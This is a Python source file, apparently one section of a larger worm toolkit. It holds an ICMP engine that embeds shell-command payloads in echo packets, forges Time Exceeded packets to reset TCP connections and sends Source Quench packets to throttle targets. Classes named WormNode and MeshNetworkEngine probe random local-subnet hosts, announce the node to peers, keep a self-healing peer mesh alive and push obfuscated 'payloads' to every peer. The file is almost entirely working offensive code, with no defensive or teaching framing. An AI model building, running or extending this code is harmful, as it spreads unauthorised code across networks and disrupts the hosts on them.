        result: Dict[str, Any] = {"status": "injected", "target": target_ip}

        if not payload_content:
            payload_content = "echo 'worm_injected' > /tmp/.icmp_inject"

        # Embed payload in ICMP echo reply with specific pattern
        payload_data = b"EXEC" + payload_content.encode()[:200]
        pkt = self._build_icmp_packet(0, 0, payload_data, icmp_id=0xC1C2, icmp_seq=1)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"CKAB L4: Payload injected via ICMP to {target_ip}")
        else:
            result["status"] = "failed"

        return result

    def icmp_address_mask_request(self, target_ip: str) -> Dict[str, Any]:
        """ICMP Address Mask Request (Type 17) to discover subnet mask."""
        result: Dict[str, Any] = {"target": target_ip, "mask": None}

        pkt = self._build_icmp_packet(17, 0, b"", icmp_id=os.getpid() & 0xFFFF, icmp_seq=1)
        if self._send_raw_icmp(target_ip, pkt):
            resp = self._recv_icmp(timeout=3.0)
            if resp:
                data, src = resp
                if len(data) >= 32:
                    mask_bytes = data[28:32]
                    result["mask"] = socket.inet_ntoa(mask_bytes)

        return result

    def icmp_record_route(self, target_ip: str) -> Dict[str, Any]:
        """Send ICMP echo with IP Record Route option."""
        result: Dict[str, Any] = {"target": target_ip, "route": []}
        # Record Route uses IP option, captured by TTL sweep
        sweep = self.icmp_ttl_sweep(target_ip, max_ttl=30)
        result["route"] = [h["ip"] for h in sweep.get("hops", [])]
        return result

    def icmp_time_exceeded_reset(self, target_ip: str) -> Dict[str, Any]:
        """ICMP Time Exceeded (Type 11) to trigger TCP RST on connections."""
        result: Dict[str, Any] = {"status": "sent", "target": target_ip}

        # Craft packet that looks like it caused time exceeded
        orig_pkt = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 0, 0, 1, 6, 0,
                               socket.inet_aton(self.src_ip), socket.inet_aton(target_ip))
        payload = b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + orig_pkt[:28]
        pkt = self._build_icmp_packet(11, 0, payload, icmp_id=0, icmp_seq=0)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP time exceeded sent to {target_ip}")
        else:
            result["status"] = "failed"

        return result

    def icmp_source_quench(self, target_ip: str) -> Dict[str, Any]:
        """ICMP Source Quench (Type 4) to throttle target's transmission."""
        result: Dict[str, Any] = {"status": "sent", "target": target_ip}

        pkt = self._build_icmp_packet(4, 0, b"\x00" * 20, icmp_id=0, icmp_seq=0)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP source quench sent to {target_ip}")
        else:
            result["status"] = "failed"

        return result

    # ---- Stop ----------------------------------------------------------------

    def stop(self) -> None:
        """Stop all ICMP operations."""
        self._running = False
        log.info("ICMPEngine stopped")


# =============================================================================
# WormNode — Self-Healing Mesh Node Identity
# =============================================================================

class NodeState(Enum):
    BOOTSTRAPPING = "bootstrapping"
    ACTIVE = "active"
    HEALING = "healing"
    DEAD = "dead"
    QUARANTINED = "quarantined"


class WormNode:
    """Self-healing mesh node with AES/Fernet encryption, heartbeat,
    bootstrap, and consensus participation.

    Each WormNode instance represents this host's identity in the mesh.
    It maintains peer lists, heartbeats for health checking, and
    encrypted state persistence.
    """

    def __init__(
        self,
        ip: str,
        port: int = 22,
        hostname: str = "",
        db: Optional['Database'] = None,
    ):
        self.node_id = str(uuid.uuid4())
        self.ip = ip
        self.port = port
        self.hostname = hostname or socket.gethostname()
        self.os_name = sys.platform
        self.arch = os.uname().machine if hasattr(os, "uname") else "unknown"
        self.db = db or Database()
        self.state = NodeState.BOOTSTRAPPING
        self.peers: Set[str] = set()

        # Encryption
        self.encryption_key, self.fernet_key_b64 = _generate_key(self.node_id)
        self.public_key = hashlib.sha3_256((self.node_id + str(time.time())).encode()).hexdigest()

        # Heartbeat thread
        self._running = False
        self._hb_thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()

    # ---- Peer Management -----------------------------------------------------

    def add_peer(self, peer_ip: str) -> None:
        with self._lock:
            self.peers.add(peer_ip)
        log.info(f"Node {self.node_id[:8]}: added peer {peer_ip}")

    def remove_peer(self, peer_ip: str) -> None:
        with self._lock:
            self.peers.discard(peer_ip)
        log.info(f"Node {self.node_id[:8]}: removed peer {peer_ip}")

    def get_peers(self) -> List[str]:
        with self._lock:
            return sorted(list(self.peers))

    # ---- Encryption ----------------------------------------------------------

    def encrypt_state(self) -> str:
        """Encrypt the node's full state dictionary for secure storage."""
        raw = json.dumps(self.to_dict(), indent=2)
        return _aes_encrypt(raw, self.encryption_key)

    def decrypt_state(self, ciphertext: str) -> Dict:
        """Restore node state from encrypted storage."""
        raw = _aes_decrypt(ciphertext, self.encryption_key)
        return json.loads(raw)

    def to_dict(self) -> Dict:
        return {
            "node_id": self.node_id,
            "ip": self.ip,
            "port": self.port,
            "hostname": self.hostname,
            "os_name": self.os_name,
            "arch": self.arch,
            "public_key": self.public_key,
            "state": self.state.value,
            "peers": list(self.peers),
        }

    # ---- Persistence ---------------------------------------------------------

    def save_to_db(self) -> None:
        """Persist node state to the database."""
        self.db.add_node(
            ip=self.ip,
            hostname=self.hostname,
            port=self.port,
            os_name=self.os_name,
            arch=self.arch,
            public_key=self.public_key,
            encryption_key=base64.urlsafe_b64encode(self.encryption_key).decode(),
        )
        encrypted = self.encrypt_state()
        self.db.set_mesh_value(f"node_state_{self.node_id}", encrypted)
        self.db.log(f"Node {self.node_id[:8]} ({self.ip}) state saved", "INFO", self.node_id[:8])

    def restore_from_db(self) -> bool:
        """Restore node state from the database. Returns True on success."""
        encrypted = self.db.get_mesh_value(f"node_state_{self.node_id}")
        if not encrypted:
            return False
        try:
            data = self.decrypt_state(encrypted)
            self.ip = data.get("ip", self.ip)
            self.port = data.get("port", self.port)
            self.hostname = data.get("hostname", self.hostname)
            self.os_name = data.get("os_name", self.os_name)
            self.arch = data.get("arch", self.arch)
            self.public_key = data.get("public_key", self.public_key)
            self.state = NodeState(data.get("state", NodeState.ACTIVE.value))
            self.peers = set(data.get("peers", []))
            return True
        except Exception as exc:
            log.error(f"Failed to restore node state: {exc}")
            return False

    # ---- Heartbeat -----------------------------------------------------------

    def start_heartbeat(self) -> None:
        """Start the background heartbeat thread for self-healing."""
        if self._hb_thread and self._hb_thread.is_alive():
            return
        self._running = True
        self._hb_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self._hb_thread.start()
        log.info(f"Node {self.node_id[:8]}: heartbeat started")

    def stop_heartbeat(self) -> None:
        """Stop the heartbeat thread."""
        self._running = False
        if self._hb_thread:
            self._hb_thread.join(timeout=5)
        log.info(f"Node {self.node_id[:8]}: heartbeat stopped")

    def _heartbeat_loop(self) -> None:
        """Background thread that periodically checks node health and heals."""
        while self._running:
            try:
                time.sleep(random.uniform(25, 35))

                # Check connectivity to peers
                dead_peers: List[str] = []
                icmp = ICMPEngine(self.db)
                for peer_ip in list(self.peers):
                    if not icmp.icmp_keepalive(peer_ip):
                        dead_peers.append(peer_ip)
                        log.warning(f"Peer {peer_ip} unreachable from {self.ip}")

                # Remove dead peers
                for dp in dead_peers:
                    self.peers.discard(dp)
                    peer_nodes = self.db.get_active_nodes()
                    for pn in peer_nodes:
                        if pn["ip"] == dp:
                            self.db.mark_node_dead(pn["id"])
                            break

                # Attempt reconnection to a random subset of dead peers
                if dead_peers:
                    log.info(f"Healing: attempting reconnect to {len(dead_peers)} dead peers")
                    for dp in dead_peers[:3]:
                        time.sleep(random.uniform(2, 8))
                        if icmp.icmp_keepalive(dp):
                            self.peers.add(dp)
                            log.info(f"Peer {dp} reconnected successfully")

                # State persistence every heartbeat
                self.state = NodeState.ACTIVE
                self.save_to_db()

            except Exception as exc:
                log.error(f"Heartbeat error: {exc}")
                self.state = NodeState.HEALING
                time.sleep(10)

    # ---- Bootstrap -----------------------------------------------------------

    def bootstrap(self, seed_peers: Optional[List[str]] = None) -> None:
        """Bootstrap into the mesh network.

        Connects to seed peers, announces presence, syncs peer lists.
        """
        self.state = NodeState.BOOTSTRAPPING

        if seed_peers:
            for sp in seed_peers:
                self.add_peer(sp)

        # Try to restore from DB first
        if self.restore_from_db():
            log.info(f"Node {self.node_id[:8]}: restored from DB with {len(self.peers)} peers")
        else:
            log.info(f"Node {self.node_id[:8]}: fresh bootstrap, no prior state")

        # Announce to all known peers
        for peer_ip in list(self.peers):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((peer_ip, self.port))
                announcement = json.dumps({
                    "type": "ANNOUNCE",
                    "node_id": self.node_id,
                    "ip": self.ip,
                    "public_key": self.public_key,
                    "peers": list(self.peers),
                })
                s.sendall(announcement.encode()[:4096])
                s.close()
                log.debug(f"Bootstrapped: announced to {peer_ip}")
            except Exception:
                log.debug(f"Bootstrap: {peer_ip} unreachable, removing")
                self.remove_peer(peer_ip)

        self.state = NodeState.ACTIVE
        self.save_to_db()
        self.start_heartbeat()
        log.info(f"Node {self.node_id[:8]}: bootstrap complete with {len(self.peers)} peers")

    # ---- Consensus (simple majority) -----------------------------------------

    def request_consensus(self, topic: str = "leader_election") -> Dict[str, Any]:
        """Request consensus vote from all active peers on a topic.

        Returns the majority decision.
        """
        votes: Dict[str, int] = {}
        for peer_ip in list(self.peers):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((peer_ip, self.port))
                msg = json.dumps({
                    "type": "CONSENSUS_REQUEST",
                    "topic": topic,
                    "node_id": self.node_id,
                })
                s.sendall(msg.encode()[:4096])
                resp = s.recv(4096).decode(errors="replace")
                s.close()
                if resp:
                    data = json.loads(resp)
                    vote = data.get("vote", "abstain")
                    votes[vote] = votes.get(vote, 0) + 1
            except Exception:
                continue

        # Determine majority
        result: Dict[str, Any] = {
            "topic": topic,
            "votes": votes,
            "total_voters": len(self.peers),
            "decision": "unknown",
        }
        if votes:
            max_votes = max(votes.values())
            result["decision"] = [k for k, v in votes.items() if v == max_votes][0]

        return result


# =============================================================================
# MeshNetworkEngine — DHT Discovery + Consensus + Split-Brain
# =============================================================================

class MeshMessageType(Enum):
    PING = "PING"
    PONG = "PONG"
    NODE_LIST = "NODE_LIST"
    PAYLOAD_SYNC = "PAYLOAD_SYNC"
    CONSENSUS_VOTE = "CONSENSUS_VOTE"
    STATE_SYNC = "STATE_SYNC"
    ANNOUNCE = "ANNOUNCE"
    SPLIT_BRAIN_RECOVERY = "SPLIT_BRAIN_RECOVERY"


@dataclass
class MeshMessage:
    """Standard message format for mesh network communication."""
    msg_type: MeshMessageType
    sender_id: str
    sender_ip: str
    payload: Dict = field(default_factory=dict)

    def to_json(self) -> str:
        return json.dumps({
            "type": self.msg_type.value,
            "sender_id": self.sender_id,
            "sender_ip": self.sender_ip,
            "payload": self.payload,
        })

    @classmethod
    def from_json(cls, data: str) -> 'MeshMessage':
        parsed = json.loads(data)
        return cls(
            msg_type=MeshMessageType(parsed["type"]),
            sender_id=parsed["sender_id"],
            sender_ip=parsed["sender_ip"],
            payload=parsed.get("payload", {}),
        )


class ConsistentHashRing:
    """Consistent hashing ring for payload distribution across mesh nodes.

    Maps payload keys to responsible nodes using SHA-256 hashing.
    """

    def __init__(self, nodes: Optional[List[Dict]] = None, replicas: int = 3):
        self.nodes = nodes or []
        self.replicas = replicas
        self._ring: Dict[int, Dict] = {}
        self._sorted_keys: List[int] = []
        self._build_ring()

    def _hash(self, key: str) -> int:
        return int(hashlib.sha3_256(key.encode()).hexdigest(), 16)

    def _build_ring(self) -> None:
        self._ring = {}
        for node in self.nodes:
            node_id = node.get("id", node.get("node_id", str(uuid.uuid4())))
            for i in range(self.replicas):
                hash_key = self._hash(f"{node_id}:{i}")
                self._ring[hash_key] = node
        self._sorted_keys = sorted(self._ring.keys())

    def add_node(self, node: Dict) -> None:
        self.nodes.append(node)
        self._build_ring()

    def remove_node(self, node_id: str) -> None:
        self.nodes = [n for n in self.nodes if n.get("id") != node_id and n.get("node_id") != node_id]
        self._build_ring()

    def get_node(self, key: str) -> Optional[Dict]:
        if not self._sorted_keys:
            return None
        hash_key = self._hash(key)
        for ring_key in self._sorted_keys:
            if ring_key >= hash_key:
                return self._ring[ring_key]
        return self._ring[self._sorted_keys[0]]


class MeshNetworkEngine:
    """DHT-based peer discovery, consensus protocol, and split-brain recovery.

    Provides:
      - DHT peer discovery with periodic refresh
      - Consensus protocol (majority vote)
      - Split-brain detection (partition awareness)
      - Split-brain recovery via reconciliation
      - MeshMessage types for all operations
    """

    def __init__(
        self,
        node: WormNode,
        db: Optional['Database'] = None,
        listen_port: int = 10003,
    ):
        self.node = node
        self.db = db or Database()
        self.listen_port = listen_port
        self._running = False
        self._discovery_thread: Optional[threading.Thread] = None
        self._consensus_thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()

        # DHT ring
        self.hash_ring = ConsistentHashRing(replicas=3)

        # Partition tracking for split-brain detection
        self._known_partitions: Set[str] = set()
        self._partition_timeout: float = 120.0
        self._last_global_sync: float = 0.0

    # ---- Lifecycle -----------------------------------------------------------

    def start(self) -> None:
        """Start the mesh network engine: discovery + consensus threads."""
        if self._running:
            return
        self._running = True
        self._discovery_thread = threading.Thread(target=self._discovery_loop, daemon=True)
        self._discovery_thread.start()
        self._consensus_thread = threading.Thread(target=self._consensus_loop, daemon=True)
        self._consensus_thread.start()
        log.info(f"MeshNetworkEngine started on port {self.listen_port}")

    def stop(self) -> None:
        """Stop the mesh network engine."""
        self._running = False
        if self._discovery_thread:
            self._discovery_thread.join(timeout=5)
        if self._consensus_thread:
            self._consensus_thread.join(timeout=5)
        log.info("MeshNetworkEngine stopped")

    # ---- DHT Peer Discovery --------------------------------------------------

    def _discovery_loop(self) -> None:
        """Periodic DHT peer discovery and refresh."""
        while self._running:
            try:
                time.sleep(random.uniform(30, 60))

                # Refresh the DHT ring with active nodes from DB
                active_nodes = self.db.get_active_nodes()
                if active_nodes:
                    self.hash_ring = ConsistentHashRing(active_nodes, replicas=3)

                # Ping all known peers and remove dead ones
                icmp = ICMPEngine(self.db)
                dead_peers: List[str] = []
                for peer_ip in list(self.node.get_peers()):
                    try:
                        if not icmp.icmp_keepalive(peer_ip):
                            dead_peers.append(peer_ip)
                        else:
                            # Exchange node lists
                            self._exchange_node_list(peer_ip)
                    except Exception:
                        dead_peers.append(peer_ip)

                for dp in dead_peers:
                    self.node.remove_peer(dp)

                # Discover new peers via DHT
                self._discover_new_peers()

                # Check for partitions (split-brain detection)
                self._check_partitions()

                # Global sync every 5 minutes
                if time.time() - self._last_global_sync > 300:
                    self._global_state_sync()
                    self._last_global_sync = time.time()

            except Exception as exc:
                log.error(f"Mesh discovery loop error: {exc}")
                time.sleep(10)

    def _exchange_node_list(self, peer_ip: str) -> None:
        """Exchange node lists with a peer to discover more nodes."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((peer_ip, self.listen_port))

            msg = MeshMessage(
                msg_type=MeshMessageType.NODE_LIST,
                sender_id=self.node.node_id,
                sender_ip=self.node.ip,
                payload={"peers": list(self.node.get_peers())},
            )
            s.sendall(msg.to_json().encode()[:4096])

            try:
                resp = s.recv(4096).decode(errors="replace")
                if resp:
                    response_msg = MeshMessage.from_json(resp)
                    if response_msg.msg_type == MeshMessageType.NODE_LIST:
                        new_peers = response_msg.payload.get("peers", [])
                        for np in new_peers:
                            if np != self.node.ip and np not in self.node.get_peers():
                                self.node.add_peer(np)
                                log.debug(f"Discovered new peer via DHT: {np}")
            except Exception:
                pass

            s.close()
        except Exception:
            pass

    def _discover_new_peers(self) -> None:
        """Discover new peers by probing random IPs in local subnet or known ranges."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            subnet_prefix = ".".join(local_ip.split(".")[:3])
        except Exception:
            subnet_prefix = "192.168.1"

        # Probe a few random IPs
        for _ in range(random.randint(3, 8)):
            probe_ip = f"{subnet_prefix}.{random.randint(1, 254)}"
            if probe_ip == self.node.ip or probe_ip in self.node.get_peers():
                continue
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((probe_ip, self.listen_port))
                msg = MeshMessage(
                    msg_type=MeshMessageType.PING,
                    sender_id=self.node.node_id,
                    sender_ip=self.node.ip,
                    payload={},
                )
                s.sendall(msg.to_json().encode()[:1024])
                resp = s.recv(1024).decode(errors="replace")
                s.close()
                if resp:
                    pong = MeshMessage.from_json(resp)
                    if pong.msg_type == MeshMessageType.PONG:
                        self.node.add_peer(probe_ip)
                        log.info(f"Discovered mesh peer via probing: {probe_ip}")
            except Exception:
                pass

    # ---- Consensus Protocol --------------------------------------------------

    def _consensus_loop(self) -> None:
        """Periodic consensus voting on mesh decisions."""
        while self._running:
            try:
                time.sleep(random.uniform(120, 180))

                # Topics for consensus
                topics = [
                    "leader_election",
                    "payload_distribution",
                    "split_brain_recovery",
                ]
                topic = random.choice(topics)
                result = self.node.request_consensus(topic)

                # Log consensus result
                if result["decision"] != "unknown":
                    self.db.log(
                        f"Consensus on '{topic}': {result['decision']} "
                        f"({result['total_voters']} voters, "
                        f"{sum(result['votes'].values())} votes)",
                        "INFO",
                        "mesh_consensus",
                    )

            except Exception as exc:
                log.error(f"Consensus loop error: {exc}")
                time.sleep(10)

    # ---- Split-Brain Detection & Recovery -----------------------------------

    def _check_partitions(self) -> None:
        """Detect network partitions (split-brain conditions).

        A partition is detected when a peer fails to respond but
        other peers report it as active.
        """
        active_peers = self.node.get_peers()
        if len(active_peers) < 3:
            return  # Not enough peers for meaningful partition detection

        # Check each peer through multiple paths
        icmp = ICMPEngine(self.db)
        for peer_ip in active_peers:
            if not icmp.icmp_keepalive(peer_ip):
                # Ask other peers about this one
                confirmations = 0
                denials = 0
                for other_ip in active_peers:
                    if other_ip == peer_ip:
                        continue
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3)
                        s.connect((other_ip, self.listen_port))
                        msg = MeshMessage(
                            msg_type=MeshMessageType.PING,
                            sender_id=self.node.node_id,
                            sender_ip=self.node.ip,
                            payload={"target_ip": peer_ip},
                        )
                        s.sendall(msg.to_json().encode()[:1024])
                        resp = s.recv(1024).decode(errors="replace")
                        s.close()
                        if resp:
                            pong = MeshMessage.from_json(resp)
                            if pong.payload.get("alive", False):
                                confirmations += 1
                            else:
                                denials += 1
                    except Exception:
                        denials += 1

                partition_id = f"partition_{peer_ip}"
                if confirmations >= denials and confirmations > 0:
                    # Only we can't reach this peer — possible partition
                    self._known_partitions.add(partition_id)
                    log.warning(f"Split-brain detected: {peer_ip} reachable by others but not us")
                elif denials > confirmations:
                    # Peer is actually dead — remove
                    if partition_id in self._known_partitions:
                        self._known_partitions.discard(partition_id)
                    self.node.remove_peer(peer_ip)
                    self.db.mark_node_dead(
                        self._find_node_id_by_ip(peer_ip)
                    )

    def _find_node_id_by_ip(self, ip: str) -> str:
        """Find a node ID from the DB by IP address."""
        nodes = self.db.get_active_nodes()
        for n in nodes:
            if n["ip"] == ip:
                return n["id"]
        return ""

    def recover_split_brain(self, partition_id: str) -> Dict[str, Any]:
        """Attempt to recover from a split-brain condition.

        Reconciles state by broadcasting recovery messages to all peers.
        """
        result: Dict[str, Any] = {"partition": partition_id, "recovered": False}

        recovery_msg = MeshMessage(
            msg_type=MeshMessageType.SPLIT_BRAIN_RECOVERY,
            sender_id=self.node.node_id,
            sender_ip=self.node.ip,
            payload={
                "partition_id": partition_id,
                "node_state": self.node.to_dict(),
                "timestamp": time.time(),
            },
        )

        # Broadcast to all peers
        for peer_ip in self.node.get_peers():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((peer_ip, self.listen_port))
                s.sendall(recovery_msg.to_json().encode()[:4096])
                s.close()
                result["recovered"] = True
            except Exception:
                continue

        if result["recovered"]:
            self._known_partitions.discard(partition_id)
            log.info(f"Split-brain recovery initiated for {partition_id}")

        return result

    # ---- State Sync ----------------------------------------------------------

    def _global_state_sync(self) -> None:
        """Synchronize global mesh state across all peers.

        Each peer broadcasts its node list and payload list for reconciliation.
        """
        active_nodes = self.db.get_active_nodes()
        payloads = self.db.get_payloads(limit=50)

        sync_msg = MeshMessage(
            msg_type=MeshMessageType.STATE_SYNC,
            sender_id=self.node.node_id,
            sender_ip=self.node.ip,
            payload={
                "nodes": [n["ip"] for n in active_nodes],
                "node_count": len(active_nodes),
                "payload_count": len(payloads),
                "peers": list(self.node.get_peers()),
            },
        )

        # Broadcast to all peers
        for peer_ip in self.node.get_peers():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((peer_ip, self.listen_port))
                s.sendall(sync_msg.to_json().encode()[:4096])
                s.close()
            except Exception:
                continue

        self.db.log(
            f"Global state sync: {len(active_nodes)} nodes, {len(payloads)} payloads",
            "INFO",
            "mesh_sync",
        )

    # ---- Payload Sync --------------------------------------------------------

    def sync_payload(self, payload_id: str, payload_content: str) -> bool:
        """Sync a payload to all mesh peers.

        Returns True if at least one peer received the payload.
        """
        success = False
        payload_msg = MeshMessage(
            msg_type=MeshMessageType.PAYLOAD_SYNC,
            sender_id=self.node.node_id,
            sender_ip=self.node.ip,
            payload={
                "payload_id": payload_id,
                "content": payload_content,
            },
        )

        for peer_ip in self.node.get_peers():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((peer_ip, self.listen_port))
                s.sendall(payload_msg.to_json().encode()[:65536])
                s.close()
                success = True
            except Exception:
                continue

        return success

    # ---- Listener (mesh TCP server, runs in caller thread) -------------------

    def run_listener(self) -> None:
        """Run the mesh listener TCP server.

        This blocks and handles incoming mesh messages.
        Should be run in a dedicated thread.
        """
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", self.listen_port))
            server.listen(10)
            server.settimeout(1.0)
            log.info(f"Mesh listener on port {self.listen_port}")

            while self._running:
                try:
                    conn, addr = server.accept()
                    conn.settimeout(5)
                    data = conn.recv(65536).decode(errors="replace")
                    conn.close()

                    if not data:
                        continue

                    msg = MeshMessage.from_json(data)

                    # Handle message based on type
                    if msg.msg_type == MeshMessageType.PING:
                        pong = MeshMessage(
                            msg_type=MeshMessageType.PONG,
                            sender_id=self.node.node_id,
                            sender_ip=self.node.ip,
                            payload={"alive": True},
                        )
                        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        conn.settimeout(5)
                        conn.connect((addr[0], self.listen_port))
                        conn.sendall(pong.to_json().encode()[:1024])
                        conn.close()

                    elif msg.msg_type == MeshMessageType.NODE_LIST:
                        # Exchange peer lists
                        resp = MeshMessage(
                            msg_type=MeshMessageType.NODE_LIST,
                            sender_id=self.node.node_id,
                            sender_ip=self.node.ip,
                            payload={"peers": list(self.node.get_peers())},
                        )
                        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        conn.settimeout(5)
                        conn.connect((addr[0], self.listen_port))
                        conn.sendall(resp.to_json().encode()[:4096])
                        conn.close()

                        # Add their peers to our list
                        new_peers = msg.payload.get("peers", [])
                        for np in new_peers:
                            if np != self.node.ip:
                                self.node.add_peer(np)

                    elif msg.msg_type == MeshMessageType.PAYLOAD_SYNC:
                        # Store synced payload
                        payload_id = msg.payload.get("payload_id", "")
                        content = msg.payload.get("content", "")
                        if content:
                            phash = hashlib.sha3_256(content.encode()).hexdigest()
                            self.db.store_payload(
                                variant=f"synced_{payload_id[:8]}",
                                content=content,
                                phash=phash,
                                size_bytes=len(content),
                                obfuscation="mesh_sync",
                            )
                            log.info(f"Synced payload {payload_id[:8]} from {addr[0]}")

                    elif msg.msg_type == MeshMessageType.SPLIT_BRAIN_RECOVERY:
                        partition_id = msg.payload.get("partition_id", "unknown")
                        log.info(f"Split-brain recovery message from {addr[0]} for {partition_id}")
                        self._known_partitions.discard(partition_id)

                except socket.timeout:
                    continue
                except Exception as exc:
                    log.debug(f"Mesh listener handler error: {exc}")
                    continue

            server.close()

        except Exception as exc:
            log.error(f"Mesh listener error: {exc}")


# =============================================================================
# Section C End Marker
# =============================================================================
# End of la_section_C.py
